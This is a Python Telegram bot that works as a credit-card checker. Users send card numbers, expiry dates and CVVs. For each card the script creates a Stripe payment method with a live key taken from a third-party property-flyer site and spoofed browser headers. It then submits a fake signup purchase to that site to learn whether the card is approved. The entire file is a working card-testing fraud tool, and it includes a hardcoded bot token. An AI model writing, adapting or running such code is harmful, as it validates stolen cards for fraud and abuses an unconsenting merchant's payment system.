import telebot
import threading
import requests
import random
import string
import time
import uuid
import json

BOT_TOKEN = "7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY"
bot = telebot.TeleBot(BOT_TOKEN)
user_stop_flag = {}

def random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@gmail.com"

def parse_cards(text):
    cards = []
    lines = text.replace('/', '|').splitlines()
    for line in lines:
        parts = [p.strip().replace(' ', '') for p in line.split('|')]
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
            if len(yy) == 2:
                yy = '20' + yy
            if all(p.isdigit() for p in [cc, mm, yy, cvv]):
                cards.append((cc, mm, yy, cvv))
    return cards

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(
        message.chat.id,
        "👋 Send credit cards in one of these formats (one per line):\n"
        "`CC|MM|YY|CVV`\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC/MM/YY/CVV`\n"
        "`CC/MM/YYYY/CVV`\n\n"
        "Send /stop anytime to cancel checking.",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    user_stop_flag[message.from_user.id] = True
    bot.send_message(message.chat.id, "⏹️ Checking stopped.")

def check_card_flow(message, cards):
    user_id = message.from_user.id
    chat_id = message.chat.id
    user_stop_flag[user_id] = False

    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        if user_stop_flag.get(user_id):
            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
            break

        email = random_email()
        name = "Peshang Salam"
        firstname = "Peshang"
        lastname = "Salam"
        password = "War112233$%"

        # Prepare Stripe parameters with your exact values, including guid, muid, sid as UUID strings
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        stripe_payload = {
            "billing_details[name]": name,
            "billing_details[email]": email,
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy[-2:],  # last 2 digits of year
            "card[exp_month]": mm,
            "allow_redisplay": "unspecified",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/c4c47a1722; stripe-js-v3/c4c47a1722; payment-element; deferred-intent",
            "referrer": "https://www.cribflyer.com",
            "time_on_page": str(random.randint(10000, 99999)),
            "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_QzBMW6gThdrTmOZ1k4lPJtSU",
        }

        stripe_headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        }

        try:
            stripe_resp = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=stripe_payload,
                headers=stripe_headers,
                timeout=30
            )
            stripe_resp.raise_for_status()
            stripe_json = stripe_resp.json()
        except Exception as e:
            bot.send_message(chat_id, f"❌ Stripe Error: {str(e)}")
            continue

        pmid = stripe_json.get("id", "")
        if not pmid.startswith("pm_"):
            bot.send_message(chat_id, f"❌ Stripe error for card {cc}: <code>{stripe_resp.text[:200]}</code>", parse_mode="HTML")
            continue

        crib_payload = {
            "email": email,
            "name": name,
            "firstname": firstname,
            "lastname": lastname,
            "password": password,
            "confpassword": password,
            "product": "property_plan",
            "qty": "1",
            "pmid": pmid
        }

        crib_headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": f"cfid=f0999602-b357-441d-bce3-5e8d6861c302; cftoken=0; __stripe_mid={muid}; __stripe_sid={sid};",
            "origin": "https://www.cribflyer.com",
            "priority": "u=1, i",
            "referer": "https://www.cribflyer.com/signup?p=property_plan&qty=1",
            "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }

        crib_resp_text = ""
        crib_json = {"ERROR": True}  # default fail

        for attempt in range(3):
            try:
                crib_resp = requests.post(
                    "https://www.cribflyer.com/signup/api",
                    data=crib_payload,
                    headers=crib_headers,
                    timeout=30
                )
                crib_resp_text = crib_resp.text
                if not crib_resp_text.strip():
                    raise ValueError("Empty response from CribFlyer API")
                crib_json = crib_resp.json()
                break
            except (json.JSONDecodeError, ValueError) as e:
                if attempt == 2:
                    bot.send_message(chat_id,
                        f"❌ CribFlyer JSON Decode Error after 3 attempts\nRaw response:\n<code>{crib_resp_text[:400]}</code>",
                        parse_mode="HTML")
                else:
                    time.sleep(1)
            except Exception as e:
                bot.send_message(chat_id, f"❌ CribFlyer Error: {str(e)}")
                break

        status = "✅ Approved" if crib_json.get("ERROR") is False else "❌ Declined"

        bot.send_message(
            chat_id,
            f"Card {idx}/{len(cards)}: {cc}|{mm}|{yy}|{cvv}\n"
            f"Status: {status}\n"
            f"Full response:\n<code>{crib_resp_text}</code>",
            parse_mode="HTML"
        )

        if idx < len(cards):
            for _ in range(15, 0, -1):
                if user_stop_flag.get(user_id):
                    bot.send_message(chat_id, "⏹️ Checking stopped by user.")
                    return
                bot.send_chat_action(chat_id, 'typing')
                time.sleep(1)

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    if message.text and message.text.strip().startswith('/') and message.text.lower() not in ['/start', '/stop']:
        return

    cards = parse_cards(message.text)
    if not cards:
        bot.send_message(
            message.chat.id,
            "❌ Format not recognized. Please send cards as:\n"
            "`CC|MM|YY|CVV`\n"
            "`CC|MM|YYYY|CVV`\n"
            "`CC/MM/YY/CVV`\n"
            "`CC/MM/YYYY/CVV`",
            parse_mode="Markdown"
        )
        return

    bot.send_message(message.chat.id, f"🔍 Checking {len(cards)} card(s)... (send /stop to cancel)")
    threading.Thread(target=check_card_flow, args=(message, cards)).start()

if __name__ == '__main__':
    bot.infinity_polling()
